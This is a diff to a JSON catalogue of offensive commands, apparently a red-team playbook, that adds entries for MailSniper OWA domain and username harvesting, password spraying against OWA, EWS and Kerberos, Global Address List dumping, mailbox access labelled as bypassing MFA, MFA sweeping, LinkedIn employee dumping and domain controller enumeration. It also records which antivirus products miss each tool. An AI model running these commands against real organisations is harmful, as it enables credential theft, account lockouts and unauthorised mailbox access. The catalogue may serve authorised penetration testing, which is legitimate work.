@@ -1371,21 +1371,74 @@
         "commands": [
             {
                 "id": "77b80a4a-d8e9-48aa-b9d1-f201bd7c68ae",
-                "name": "Get internal domain names",
+                "name": "Get internal domain names via timingattack",
                 "description": "",
                 "tag": "",
-                "results": [],
-                "cmd": "ipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100"
+                "results": [
+                    "INTEL:DOMAIN:DOMAINS"
+                ],
+                "cmd": "ipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname mail.domain.com -OutFile\npotential_domains.txt -CompanyName \"Target Name\"",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
             },
             {
                 "id": "90f47a63-a165-4864-a3b1-5ef66ff184ef",
-                "name": "Password Spray",
+                "name": "Password Spray OWA",
                 "description": "",
                 "tag": "",
                 "results": [
                     "CRED:PASS:PLAIN"
                 ],
-                "cmd": "Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022",
+                "cmd": "Invoke-PasswordSprayOWA -ExchHostname <10.10.15.100> -UserList <.\\valid.txt> -Password <Summer2022> -Threads 15 -OutFile owa-sprayed-creds.txt",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
+            },
+            {
+                "id": "94a3d9b5-f730-4389-8256-54c9ff91856b",
+                "name": "Enumerate usernames based on timingattack",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:USERS"
+                ],
+                "cmd": "Invoke-UsernameHarvestOWA -UserList <.\\username_list.txt> -ExchHostname\n<mail.domain.com> -Domain <the_identified_internal_domain_name< -OutFile\n<potential_usernames.txt>",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
+            },
+            {
+                "id": "a2abdd17-8adc-4597-9c7a-7e0280249f0f",
+                "name": "Password Spray EWS",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-PasswordSprayEWS -ExchHostname <mail.domain.com> -UserList <userlist.txt>\n-Password <Fall2016> -Threads 15 -OutFile sprayed-ews-creds.txt",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
+            },
+            {
+                "id": "7b4bb785-c4f2-4ff0-a901-a9199896ec54",
+                "name": "Get Global Address List (GAL)",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:USERS"
+                ],
+                "cmd": "Get-GlobalAddressList -ExchHostname <mail.domain.com> -UserName <domain\\username> -Password <Fall2016> -OutFile global-address-list.txt",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
+            },
+            {
+                "id": "1b6977a0-9ae2-4ca2-bc9f-a783fb79c09f",
+                "name": "Access mailbox through EWS (bypass MFA)",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-SelfSearch -Mailbox <target@domain.com> -ExchHostname <mail.domain.com> -remote\n\n\u2022.PARAMETER Terms\nCertain terms to search through each email subject and body for.\n\u2022.PARAMETER Folder\nThe folder of each mailbox to search.\n\u2022.PARAMETER Regex\nThe regex parameter allows for the use of regular expressions when doing searches.\n\u2022.PARAMETER CheckAttachments\nThis option will attempt to search through the contents of email attachments in\naddition to the default body/subject.",
                 "requirements": {
                     "tag": "SERVICE:OWA"
                 }
@@ -1498,7 +1551,16 @@
         "undetected": [],
         "detected": [],
         "content": "",
-        "commands": []
+        "commands": [
+            {
+                "id": "01e1b753-9768-4703-9e37-982380fb659c",
+                "name": "Check MFA for MS Services",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 "
+            }
+        ]
     },
     {
         "name": "Mimikatz",
@@ -1603,16 +1665,70 @@
             "04. Persistence"
         ],
         "category": "",
-        "stealthy": false,
+        "stealthy": true,
         "platforms": [
             "Windows"
         ],
-        "source": "",
-        "description": "MMC console from windows",
-        "undetected": [],
+        "source": "https://learn.microsoft.com/de-de/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console",
+        "description": "Sie verwenden die Microsoft Management Console (MMC) zum Erstellen, Speichern und \u00d6ffnen von Verwaltungstools, die als Konsolen bezeichnet werden und die Hardware-, Software- und Netzwerkkomponenten Ihres Microsoft Windows-Betriebssystems verwalten. MMC wird auf allen Clientbetriebssystemen ausgef\u00fchrt, die derzeit unterst\u00fctzt werden.",
+        "undetected": [
+            "Windows Defender (AV)",
+            "MDE",
+            "Symantec",
+            "McAfee"
+        ],
         "detected": [],
-        "content": "\n## [[Local User+Groups]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Local users and Groups\n\n## [[Services]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Services\nor `services.msc`\n\n## [[Priv Esc/Scheduled Tasks]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Task Scheduler\nor `taskschd.msc`\n\n## [[Shares]] [[Logged In Users]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Shared Folders\n\n\n",
-        "commands": []
+        "content": "\n## [[Local User+Groups]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Local users and Groups\n\n## [[Services]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Services\nor 'services.msc'\n\n## [[Priv Esc/Scheduled Tasks]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Task Scheduler\nor 'taskschd.msc'\n\n## [[Shares]] [[Logged In Users]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Shared Folders\n\n\n",
+        "commands": [
+            {
+                "id": "7fd3f7e7-ca8b-4542-9325-ae91732108b5",
+                "name": "Get local User + Groups",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:LOCAL:GROUPS",
+                    "INTEL:LOCAL:USERS"
+                ],
+                "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Local users and Groups"
+            },
+            {
+                "id": "024c607e-cffa-4979-baf4-e4419ed64b6d",
+                "name": "Get Services",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "COMPUTER:SERVICES"
+                ],
+                "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Services or services.msc"
+            },
+            {
+                "id": "7c159eb2-0da5-4c50-9191-5fecc8d0ea1c",
+                "name": "Get Scheduled Tasks",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Task Scheduler"
+            },
+            {
+                "id": "72007278-9a35-4397-acb2-dac2a0266e84",
+                "name": "Get Scheduled Tasks #2",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "taskschd.msc"
+            },
+            {
+                "id": "30bb7475-c25b-4efc-b9be-ea390e81c89c",
+                "name": "Get Shares + User Sessions",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "COMPUTER:SESSIONS",
+                    "COMPUTER:SHARES"
+                ],
+                "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Shared Folders"
+            }
+        ]
     },
     {
         "name": "mssqlclient",
@@ -2099,6 +2215,14 @@
                 "tag": "",
                 "results": [],
                 "cmd": "#APPLOCKER\nGet-ChildItem -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\SRPV2'\nGet-ChildItem -Path 'HKLM:\\System\\CurrentControlSet\\Control\\SRP\\GP'\nGet-ChildItem -Path \n#WDAC\n'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v DeployConfigCIPolicy'\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard -v ConfigCIPolicyFilePath'"
+            },
+            {
+                "id": "0b63dd81-e89a-4934-b625-4ab767e81149",
+                "name": "Trigger WSUS",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "$updateSession = New-Object -com \"Microsoft.Update.Session\"; $updates=$updateSession.CreateupdateSearcher().Search($criteria).Updates; wuauclt.exe /reportnow"
             }
         ]
     },
@@ -3446,7 +3570,18 @@
         "description": "This script gets all accepted domains in Microsoft 365 using autodiscover, gets the tenant name and checks if there is a Microsoft Defender for Identity instance. This way you can figure out if a company runs Microsoft Defender for Identity.",
         "undetected": [],
         "detected": [],
-        "commands": [],
+        "commands": [
+            {
+                "id": "2679189c-57e4-4901-abf6-b6055aa45d08",
+                "name": "Search for MDI",
+                "description": "This script is not 100% accurate!",
+                "tag": "",
+                "results": [
+                    "AV:MDI"
+                ],
+                "cmd": "Import-Module Invoke-MicrosoftDefenderForIdentityCheckInstance.psm1\nInvoke-MicrosoftDefenderForIdentityCheckInstance -domain <domain>"
+            }
+        ],
         "content": "",
         "references": []
     },
@@ -3507,6 +3642,114 @@
                         }
                     ]
                 }
+            }
+        ],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "kerbrute",
+        "phases": [
+            "07. Lateral Movement",
+            "08. Credentials & User Impersonation"
+        ],
+        "category": "",
+        "stealthy": false,
+        "platforms": [
+            "Linux"
+        ],
+        "source": "https://github.com/ropnop/kerbrute",
+        "description": "This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.\nIt is designed to be used on an internal Windows domain with access to one of the Domain Controllers.\nWarning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "715412f9-fc86-47a6-9e93-00812affcdb4",
+                "name": "Password Spray",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>",
+                "requirements": {
+                    "tag": "a"
+                }
+            },
+            {
+                "id": "994572e2-b623-42f2-85a0-5a6d217d3ba5",
+                "name": "User Enumeration",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt",
+                "requirements": {
+                    "tag": "L"
+                }
+            }
+        ],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "LinkedInDumper",
+        "phases": [
+            "02. Reconnaissance"
+        ],
+        "category": "",
+        "stealthy": true,
+        "platforms": [
+            "Python"
+        ],
+        "source": "https://github.com/l4rm4nd/LinkedInDumper",
+        "description": "Python 3 script to dump company employees from LinkedIn API\n\n",
+        "undetected": [],
+        "detected": [],
+        "commands": [
+            {
+                "id": "307f5b97-4560-4f46-813e-cdb8cb6837ad",
+                "name": "Dump linkedin users",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:EMAILS"
+                ],
+                "cmd": "usage: linkedindumper.py [-h] --url <linkedin-url> [--cookie <cookie>] [--quiet] [--include-private-profiles] [--email-format EMAIL_FORMAT]\n\noptions:\n  -h, --help            show this help message and exit\n  --url <linkedin-url>  A LinkedIn company url - https://www.linkedin.com/company/<company>\n  --cookie <cookie>     LinkedIn 'li_at' session cookie\n  --quiet               Show employee results only\n  --include-private-profiles\n                        Show private accounts too\n  --email-format        Python string format for emails; for example:\n                         [1] john.doe@example.com > '{0}.{1}@example.com'\n                         [2] j.doe@example.com > '{0[0]}.{1}@example.com'\n                         [3] jdoe@example.com > '{0[0]}{1}@example.com'\n                         [4] doe@example.com > '{1}@example.com'\n                         [5] john@example.com > '{0}@example.com'\n                         [6] jd@example.com > '{0[0]}{1[0]}@example.com'"
+            }
+        ],
+        "content": "",
+        "references": []
+    },
+    {
+        "name": "nltest",
+        "phases": [
+            "06. Domain Enumeration"
+        ],
+        "category": "",
+        "stealthy": false,
+        "platforms": [
+            "Windows"
+        ],
+        "source": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)",
+        "description": "Nltest is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).",
+        "undetected": [
+            "Windows Defender (AV)",
+            "MDE",
+            "McAfee"
+        ],
+        "detected": [],
+        "commands": [
+            {
+                "id": "6f33649c-a7d6-4a78-861f-2396b89cbda3",
+                "name": "Get DC of domain",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:DOMAIN:DC"
+                ],
+                "cmd": "nltest /dclist:<domain>"
             }
         ],
         "content": "",
